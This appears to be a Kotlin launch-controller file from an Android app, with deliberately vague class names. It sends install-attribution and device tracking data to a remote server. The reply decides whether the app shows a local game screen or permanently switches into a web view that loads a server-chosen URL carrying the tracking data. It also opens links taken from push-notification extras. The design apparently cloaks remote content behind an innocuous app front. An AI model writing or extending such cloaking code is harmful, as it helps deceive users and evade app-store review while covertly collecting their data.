package com.tf.aurora.boot

import android.app.Activity
import android.content.Intent
import com.tf.aurora.keep.Coffer
import com.tf.aurora.mask.Trace
import com.tf.aurora.net.Ledger
import com.tf.aurora.net.OraclePost
import com.tf.aurora.net.OracleReply
import com.tf.aurora.net.PulseCheck
import com.tf.aurora.track.BeaconHub
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

sealed class Stage {
    data object Pulse : Stage()
    data object Lost : Stage()
    data class Ask(val href: String, val once: Boolean) : Stage()
    data class Pane(val href: String, val once: Boolean) : Stage()
    data object Arena : Stage()
}

class FateDirector(
    private val coffer: Coffer,
    val beacon: BeaconHub,
    private val oracle: OraclePost
) {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(job + Dispatchers.Main.immediate)
    private val _stage = MutableStateFlow<Stage>(Stage.Pulse)
    val stage: StateFlow<Stage> = _stage
    val load = MutableStateFlow(0.08f)

    @Volatile var warmHref: String? = null
        private set

    fun intake(activity: Activity, intent: Intent?) {
        val tap = peekUrl(intent)
        if (coffer.lane() != Coffer.STONE) beacon.noteLaunch(intent)
        Trace.line("intake lane=${coffer.lane()} af_id=${beacon.uid(activity)} data=${intent?.data}")
        when (coffer.lane()) {
            Coffer.STONE -> _stage.value = Stage.Arena
            Coffer.MIRROR -> {
                if (!PulseCheck.alive(activity)) _stage.value = Stage.Lost
                else scope.launch { openMirror(activity, tap) }
            }
            else -> {
                if (!PulseCheck.alive(activity)) _stage.value = Stage.Lost
                else scope.launch { firstPass(activity, intent, tap) }
            }
        }
    }

    fun retry(activity: Activity) {
        if (coffer.lane() == Coffer.MIRROR && coffer.href().isNotBlank() && !PulseCheck.alive(activity)) {
            reveal(activity, coffer.href(), once = false, force = true)
            return
        }
        intake(activity, activity.intent)
    }

    fun accept(activity: Activity) {
        val now = _stage.value
        if (now is Stage.Ask) reveal(activity, now.href, now.once, force = true)
    }

    fun skip(activity: Activity) {
        coffer.markSkip()
        val now = _stage.value
        if (now is Stage.Ask) reveal(activity, now.href, now.once, force = true)
    }

    fun shutOs() {
        coffer.markShut()
    }

    fun noteAsked() {
        coffer.markAsked()
    }

    fun noteAllowed() {
        coffer.markAllowed()
    }

    fun warm(url: String) {
        if (coffer.lane() == Coffer.STONE) return
        if (url.isBlank()) return
        warmHref = url
        if (_stage.value is Stage.Pane) _stage.value = Stage.Pane(url, once = true)
    }

    private suspend fun firstPass(activity: Activity, intent: Intent?, tap: String?) {
        _stage.value = Stage.Pulse
        climb(0.18f)
        beacon.ignite(activity)
        beacon.relay(activity, intent)
        beacon.retrace(activity)
        climb(0.42f)
        val body = withContext(Dispatchers.IO) { beacon.assemble(activity, first = true) }
        climb(0.72f)
        val reply = withContext(Dispatchers.IO) { oracle.send(activity, beacon, body) }
        climb(1f)
        delay(180)
        decideFirst(activity, reply, tap)
    }

    private suspend fun openMirror(activity: Activity, tap: String?) {
        _stage.value = Stage.Pulse
        climb(0.3f)
        beacon.ignite(activity)
        beacon.relay(activity, activity.intent)
        val body = withContext(Dispatchers.IO) { beacon.assemble(activity, first = false) }
        climb(0.7f)
        val reply = withContext(Dispatchers.IO) { oracle.send(activity, beacon, body) }
        val saved = coffer.href()
        val fresh = if (reply.ok && !reply.href.isNullOrBlank()) {
            coffer.rememberHref(reply.href, reply.till)
            reply.href
        } else saved
        val href = tap?.takeIf { it.isNotBlank() } ?: fresh
        climb(1f)
        delay(160)
        if (href.isNullOrBlank()) _stage.value = Stage.Lost
        else reveal(activity, href, once = !tap.isNullOrBlank())
    }

    private fun decideFirst(activity: Activity, reply: OracleReply, tap: String?) {
        Trace.line(
            "decide ok=${reply.ok} reached=${reply.reached} hasConv=${beacon.hasAttribution()} af_id=${beacon.uid(activity)}"
        )
        if (reply.ok && !reply.href.isNullOrBlank()) {
            coffer.lockMirror(reply.href, reply.till)
            reveal(activity, tap?.takeIf { it.isNotBlank() } ?: reply.href, once = !tap.isNullOrBlank())
            return
        }
        if (reply.reached && beacon.hasAttribution()) coffer.lockStone()
        _stage.value = Stage.Arena
    }

    private fun reveal(activity: Activity, href: String, once: Boolean, force: Boolean = false) {
        val dest = Ledger.carry(href, beacon.lastBody)
        if (!force && coffer.shouldOffer(activity)) _stage.value = Stage.Ask(dest, once)
        else _stage.value = Stage.Pane(dest, once)
    }

    private suspend fun climb(target: Float) {
        while (load.value + 0.04f < target) {
            load.value = (load.value + 0.05f).coerceAtMost(target)
            delay(40)
        }
        load.value = target
    }

    private fun peekUrl(intent: Intent?): String? {
        if (intent == null) return null
        val extras = intent.extras ?: return null
        val direct = extras.getString("url")
        if (!direct.isNullOrBlank()) return direct
        extras.keySet().forEach { key ->
            if (key.equals("url", ignoreCase = true)) {
                val v = extras.getString(key)
                if (!v.isNullOrBlank()) return v
            }
        }
        return extras.getString("gcm.notification.url")
    }
}
